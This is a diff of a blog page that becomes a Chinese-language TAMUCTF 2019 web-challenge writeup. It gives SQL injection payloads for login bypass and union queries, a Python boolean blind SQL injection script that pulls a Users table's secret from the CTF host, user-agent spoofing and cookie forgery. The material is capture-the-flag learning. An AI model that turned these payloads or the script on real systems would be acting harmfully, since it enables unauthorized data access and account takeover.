@@ -6,15 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | GAP&#39;s blog</title>
+  <title>TAMUCTF2019 web writeup | GAP&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="GAP&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="Not Another SQLi Challenge万能密码 payload:username=admin&amp;amp;password=1&amp;#39;or 1=1# Buckets针对BUCKET的探针，使用浏览器打开Amazon提供的自动分配的S3 URL，格式为http://bucketname.s3.amazonaws.com 也就是修改url为http://tamuctf.s3.amazona">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TAMUCTF2019 web writeup">
+<meta property="og:url" content="http://yoursite.com/2019/03/29/TAMUCTF2019 web writeup/index.html">
 <meta property="og:site_name" content="GAP&#39;s blog">
+<meta property="og:description" content="Not Another SQLi Challenge万能密码 payload:username=admin&amp;amp;password=1&amp;#39;or 1=1# Buckets针对BUCKET的探针，使用浏览器打开Amazon提供的自动分配的S3 URL，格式为http://bucketname.s3.amazonaws.com 也就是修改url为http://tamuctf.s3.amazona">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190305221029390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/11.png">
+<meta property="og:updated_time" content="2019-03-29T14:03:17.666Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="GAP&#39;s blog">
+<meta name="twitter:title" content="TAMUCTF2019 web writeup">
+<meta name="twitter:description" content="Not Another SQLi Challenge万能密码 payload:username=admin&amp;amp;password=1&amp;#39;or 1=1# Buckets针对BUCKET的探针，使用浏览器打开Amazon提供的自动分配的S3 URL，格式为http://bucketname.s3.amazonaws.com 也就是修改url为http://tamuctf.s3.amazona">
+<meta name="twitter:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/1.png">
   
     <link rel="alternative" href="/atom.xml" title="GAP&#39;s blog" type="application/atom+xml">
   
@@ -136,74 +154,43 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-TAMUCTF2019 web writeup" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/29/HGAME2019-happyPython/" class="archive-article-date">
-  	<time datetime="2019-03-29T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-29</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/29/HGAME2019-happyPython/">HGAME2019 happyPython</a>
+    <h1 class="article-title" itemprop="name">
+      TAMUCTF2019 web writeup
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">flask</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/29/TAMUCTF2019 web writeup/" class="archive-article-date">
+        
+        <a href="/2019/03/29/TAMUCTF2019 web writeup/" class="archive-article-date">
   	<time datetime="2019-03-29T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-29</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/29/TAMUCTF2019 web writeup/">TAMUCTF2019 web writeup</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Not-Another-SQLi-Challenge"><a href="#Not-Another-SQLi-Challenge" class="headerlink" title="Not Another SQLi Challenge"></a>Not Another SQLi Challenge</h2><p>万能密码 payload:<code>username=admin&amp;password=1&#39;or 1=1#</code></p>
+<h2 id="Buckets"><a href="#Buckets" class="headerlink" title="Buckets"></a>Buckets</h2><p>针对BUCKET的探针，使用浏览器打开Amazon提供的自动分配的S3 URL，格式为<a href="http://bucketname.s3.amazonaws.com" target="_blank" rel="noopener">http://bucketname.s3.amazonaws.com</a> 也就是修改url为<a href="http://tamuctf.s3.amazonaws.com/" target="_blank" rel="noopener">http://tamuctf.s3.amazonaws.com/</a> 获得一个不受访问权限的bucket，找到关键文档Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt，获得flag。<br>学习资料：<a href="https://www.freebuf.com/articles/web/135313.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/135313.html</a></p>
+<h2 id="Science"><a href="#Science" class="headerlink" title="Science!"></a>Science!</h2><p>直接给出提示flask,判断是ssti模板注入。测试注入点Chemical1,payload1.<code></code>，注入存在<br><img src="/2019/03/29/TAMUCTF2019 web writeup/1.png" alt="在这里插入图片描述"></p>
+<h2 id="Robots-Rule"><a href="#Robots-Rule" class="headerlink" title="Robots Rule"></a>Robots Rule</h2><p>提到robots，查看robots.txt<br><img src="/2019/03/29/TAMUCTF2019 web writeup/2.png" alt="在这里插入图片描述"><br>想让我们伪造成一个googlebot,百度一个googlebot的useragent<br><img src="/2019/03/29/TAMUCTF2019 web writeup/3.png" alt="在这里插入图片描述"><br>改一下user-agent:<code>Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot;)</code><br><img src="https://img-blog.csdnimg.cn/20190305221029390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="Many-Gig’ems-to-you"><a href="#Many-Gig’ems-to-you" class="headerlink" title="Many Gig’ems to you!"></a>Many Gig’ems to you!</h2><p>一个拼接的flag<br><img src="/2019/03/29/TAMUCTF2019 web writeup/4.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/TAMUCTF2019 web writeup/5.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/TAMUCTF2019 web writeup/6.png" alt="在这里插入图片描述"><br>得到flag:<code>gigem{flag_in_source_and_}</code></p>
+<h2 id="Bird-Box-Challenge"><a href="#Bird-Box-Challenge" class="headerlink" title="Bird Box Challenge"></a>Bird Box Challenge</h2><p>开始的时候，使用了<code>-1&#39;union select database()#</code>等一系列的语句读出库名，表名等一系列数据，但是都没有什么价值。库名：SqliDB,表名：Search,列名：items,查询内容：Eggs,Trucks,Aggies<br>最后google了一下writeup，看到flag藏到了user()当中，真的是没有想到……<br>payload:<code>-1&#39;union select user()#</code><br><img src="/2019/03/29/TAMUCTF2019 web writeup/7.png" alt="在这里插入图片描述"></p>
+<h2 id="1337-Secur1ty"><a href="#1337-Secur1ty" class="headerlink" title="1337 Secur1ty"></a>1337 Secur1ty</h2><p>开始的时候注册完就直接点开了message，是一个类似于guestbook的界面，下意识地反应这应该是一个关于xss的问题，但是邮件发不出去……,用burp抓取登陆的界面，看到了Cookie当中的userid和secret，userid应当是修改为1了,但是secret却不知道应该修改为何值。<br><img src="/2019/03/29/TAMUCTF2019 web writeup/8.png" alt="在这里插入图片描述"><br>此处找到了注入点id,进行bool类型的盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s=requests.session()</span><br><span class="line">ans=&apos;&apos;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in range(37,127):</span><br><span class="line">        #url=&quot;http://web6.tamuctf.com/message?id=1%27+and+ascii(substr((select+schema_name+from+information_schema.schemata%20limit+0%2C1)%2C&quot;+str(i)+&quot;%2C1))%3D&quot;+str(j)+&quot;+and+1%3D%271&quot;</span><br><span class="line">        #url=&quot;http://web6.tamuctf.com/message?id=1%27%20and%20ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=%27Users%27limit%209,1),&quot;+str(i)+&quot;,1))%3D&quot;+str(j)+&quot;%20and%201=%271&quot;</span><br><span class="line">        #url=&quot;http://web6.tamuctf.com/message?id=1%27%20and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%202,1),&quot;+str(i)+&quot;,1))%3D&quot;+str(j)+&quot;%20and%201=%271&quot;</span><br><span class="line">        url=&quot;http://web6.tamuctf.com/message?id=1%27%20and ascii(substr((select Secret from Users limit 0,1),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot; and 1=&apos;1&quot;</span><br><span class="line">        c=s.get(url)</span><br><span class="line">        if &apos;Bob&apos; in c.text:</span><br><span class="line">            ans=ans+chr(j)</span><br><span class="line">            print(&apos;ans&apos;,ans)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/29/TAMUCTF2019 web writeup/9.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/TAMUCTF2019 web writeup/10.png" alt="在这里插入图片描述"><br>burp修改一下cookie，得到flag。<br><img src="/2019/03/29/TAMUCTF2019 web writeup/11.png" alt="在这里插入图片描述"></p>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -215,171 +202,115 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/29/TAMUCTF2019 web writeup/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/29/HGAME 2019 WEB week2/" class="archive-article-date">
-  	<time datetime="2019-03-29T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-29</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2019/03/29/HGAME2019-happyPython/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          HGAME2019 happyPython
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/03/29/HGAME 2019 WEB week2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">HGAME 2019 WEB week2</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/29/HGAME 2019 WEB week2/">HGAME 2019 WEB week2</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/29/babyGo(安恒2019.1 pop链的构造)/" class="archive-article-date">
-  	<time datetime="2019-03-29T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-29</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/29/babyGo(安恒2019.1 pop链的构造)/">babyGo(安恒2019.1 pop链的构造)</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">php</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/29/你真的会PHP吗？(实验吧)/" class="archive-article-date">
-  	<time datetime="2019-03-29T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-29</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/29/你真的会PHP吗？(实验吧)/">你真的会PHP吗？(实验吧)</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">php</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/29/加了料的报错注入(实验吧)/" class="archive-article-date">
-  	<time datetime="2019-03-29T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-29</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/29/加了料的报错注入(实验吧)/">加了料的报错注入(实验吧)</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">sql</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -402,8 +333,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
